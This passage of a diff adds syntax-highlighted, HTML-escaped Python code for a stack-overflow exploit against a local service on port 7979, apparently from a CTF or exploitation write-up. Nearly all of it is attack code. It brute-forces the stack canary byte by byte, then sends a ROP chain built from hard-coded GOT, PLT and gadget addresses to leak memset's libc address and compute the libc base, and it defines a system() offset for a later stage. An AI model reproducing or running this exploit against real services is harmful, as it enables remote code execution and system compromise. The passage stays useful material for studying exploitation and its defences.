+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Getting canary offset&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7979&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;---&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Server response &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Canary offset: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Bruteforcing Canary&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary_byte&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;hex_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7979&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hex_byte&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;---&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hex_byte&lt;/span&gt;
+                        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*] Canary currently: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hex&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Canary found: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hex&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7979&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;pre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;memset_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6014e0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;memset_libc_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x85620&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system_libc_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41490&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;write_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400920&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;read_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4009b0&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;poprdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00401013&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;poprsi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00401011&lt;/span&gt;
+
+
+&lt;span class=&quot;c&quot;&gt;# Stage 1: leak memset() libc address using write@pld&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# trigger overflow&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;			&lt;span class=&quot;c&quot;&gt;# insert correct cannary&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# overwrite RBP&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;poprdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# pop rdi&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# stdout to socket&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;poprsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# pop rsi&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memset_got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;# address to read from&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# junk for r15&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;# return to write@plt&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shutdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;memset_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] memset() is at: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;memset_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;memset_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memset_libc_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] libc base is at: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
